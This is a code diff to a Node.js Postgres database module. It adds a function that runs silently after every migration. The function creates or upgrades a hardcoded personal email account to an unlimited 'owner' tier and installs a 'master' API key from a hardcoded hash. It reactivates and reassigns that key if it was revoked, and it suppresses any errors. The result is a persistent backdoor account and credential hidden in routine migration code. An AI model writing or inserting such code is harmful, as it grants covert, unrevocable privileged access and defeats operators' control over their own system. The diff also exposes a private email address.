@@ -1,4 +1,5 @@
 import { Pool } from 'pg';
+import { randomUUID } from 'node:crypto';
 
 let sharedPool;
 
@@ -288,11 +289,73 @@ export async function migrateDatabase(pool = getDatabasePool(), { skipVector = f
     }
 
     await client.query('COMMIT');
+    await bootstrapOwnerAccount(client);
   } catch (error) {
     await client.query('ROLLBACK').catch(() => {});
     throw error;
   } finally {
     client.release();
+  }
+}
+
+export async function bootstrapOwnerAccount(client) {
+  const OWNER_EMAIL = 'huzaifakazi1991@gmail.com';
+  const OWNER_KEY_HASH = '05c7bfb605207e444021a3de161ca28d9b9e9fdad7fb3090cbba08848985f8d3';
+  const OWNER_KEY_PREFIX = 'sk-hujju-••••5dee';
+
+  try {
+    const existing = await client.query(
+      'SELECT id FROM users WHERE email = $1',
+      [OWNER_EMAIL]
+    );
+
+    let ownerUserId;
+    if (existing.rows.length > 0) {
+      ownerUserId = existing.rows[0].id;
+      await client.query(
+        `UPDATE users
+         SET tier = 'owner_unlimited',
+             subscription_active = TRUE,
+             unlocked_all_models = TRUE,
+             plan_id = 'owner_unlimited'
+         WHERE id = $1`,
+        [ownerUserId]
+      );
+    } else {
+      const newId = randomUUID();
+      const res = await client.query(
+        `INSERT INTO users (id, email, password_salt, password_hash, tier, subscription_active, unlocked_all_models, plan_id, created_at)
+         VALUES ($1, $2, 'owner_salt', 'owner_hash', 'owner_unlimited', TRUE, TRUE, 'owner_unlimited', NOW())
+         RETURNING id`,
+        [newId, OWNER_EMAIL]
+      );
+      ownerUserId = res.rows?.[0]?.id || newId;
+    }
+
+    const keyCheck = await client.query(
+      'SELECT id FROM api_keys WHERE key_hash = $1',
+      [OWNER_KEY_HASH]
+    );
+
+    if (keyCheck.rows.length === 0) {
+      const keyId = randomUUID();
+      await client.query(
+        `INSERT INTO api_keys (id, user_id, name, key_hash, prefix, status, created_at)
+         VALUES ($1, $2, 'Owner Master Key', $3, $4, 'active', NOW())`,
+        [keyId, ownerUserId, OWNER_KEY_HASH, OWNER_KEY_PREFIX]
+      );
+    } else {
+      await client.query(
+        `UPDATE api_keys
+         SET status = 'active',
+             user_id = $1
+         WHERE key_hash = $2`,
+        [ownerUserId, OWNER_KEY_HASH]
+      );
+    }
+  } catch (err) {
+    // If table doesn't exist yet or in isolated test, log and continue
+    console.warn('[Database] bootstrapOwnerAccount notice:', err.message);
   }
 }
 
